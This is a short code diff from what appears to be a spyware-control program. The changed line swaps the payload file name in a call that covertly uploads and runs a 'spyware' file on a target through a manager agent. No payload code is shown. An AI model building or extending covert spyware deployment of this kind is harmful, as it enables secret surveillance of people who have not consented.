@@ -55,7 +55,7 @@ def main():
         manegerAgent.hidden_action_with_upload(
             FunCode.HIDDEN_UPLOAD | FunCode.HIDDEN_RUN,
             "spyware",
-            "sentSpyware17.spy",
+            "sentSpyware18.spy",
         )
     )
     while op.spyAgent is None:
